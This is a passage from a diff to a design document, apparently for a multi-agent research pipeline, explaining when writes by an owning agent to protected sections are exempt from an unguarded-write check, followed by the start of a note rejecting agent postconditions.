+  `research-exhaustiveness` agent writing the declaration) is the owner doing
+  its own work with its doctrine in context, so `find_unguarded_protected_writes`
+  never flags it wherever it lands. For `proof_summaries`, `person_evidence` and
+  the declaration the hook additionally routes the write to that caller; the
+  tree writes (a `materialize_facts` mint included) are not hook-routed, and the
+  exemption rests on the writer's identity alone. So for those writes the bundle arms report 0 by construction, splice
+  order cannot change them, and `_window_overruns` does not count them. The
+  exemption is per owner: a batch the owning agent makes that also touches
+  another owner's section (a resolved `conflicts` op beside `proof_summaries`)
+  is still checked, and counted, for that other owner.
 
 - **Agent postconditions — "this agent must have made this tool call before it
   returns."** Rejected 2026-09-07 on measurement, not on cost. The mechanism
